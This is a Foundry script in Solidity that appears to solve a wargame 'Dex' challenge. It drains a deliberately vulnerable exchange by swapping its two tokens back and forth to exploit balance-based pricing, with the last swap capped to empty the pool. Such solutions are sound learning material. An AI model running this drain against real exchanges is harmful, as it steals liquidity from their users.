// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract SolveDex is Script {
    Dex public dex;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        dex = Dex(vm.envAddress("DEX_ADDRESS"));
        address token1 = dex.token1();
        address token2 = dex.token2();

        // Approve the tokens directly (not through Dex)
        IERC20(token1).approve(address(dex), type(uint256).max);
        IERC20(token2).approve(address(dex), type(uint256).max);

        // Perform swaps to drain one of the tokens from the DEX
        // Due to price calculation, we can drain the DEX by swapping back and forth
        for (uint256 i = 0; i < 10; i++) {
            uint256 dexToken1Balance = dex.balanceOf(token1, address(dex));
            uint256 dexToken2Balance = dex.balanceOf(token2, address(dex));
            uint256 myToken1Balance = dex.balanceOf(token1, msg.sender);
            uint256 myToken2Balance = dex.balanceOf(token2, msg.sender);

            if (dexToken1Balance == 0 || dexToken2Balance == 0) break;

            // Swap token1 for token2
            if (myToken1Balance > 0) {
                uint256 swapAmount = myToken1Balance;
                // Cap the swap amount to not exceed what DEX has
                uint256 expectedReturn = dex.getSwapPrice(token1, token2, swapAmount);
                if (expectedReturn > dexToken2Balance) {
                    // Calculate the exact amount needed to drain token2
                    swapAmount = (dexToken2Balance * dexToken1Balance) / dexToken2Balance;
                    if (swapAmount > myToken1Balance) swapAmount = myToken1Balance;
                }
                dex.swap(token1, token2, swapAmount);
            }

            // Update balances
            dexToken1Balance = dex.balanceOf(token1, address(dex));
            dexToken2Balance = dex.balanceOf(token2, address(dex));
            myToken1Balance = dex.balanceOf(token1, msg.sender);
            myToken2Balance = dex.balanceOf(token2, msg.sender);

            // Stop if DEX is drained
            if (dexToken1Balance == 0 || dexToken2Balance == 0) break;

            // Swap token2 for token1
            if (myToken2Balance > 0) {
                uint256 swapAmount = myToken2Balance;
                // Cap the swap amount to not exceed what DEX has
                uint256 expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
                if (expectedReturn > dexToken1Balance) {
                    // Calculate the exact amount needed to drain token1
                    swapAmount = (dexToken1Balance * dexToken2Balance) / dexToken1Balance;
                    if (swapAmount > myToken2Balance) swapAmount = myToken2Balance;
                }
                dex.swap(token2, token1, swapAmount);
            }
        }

        vm.stopBroadcast();
    }
}
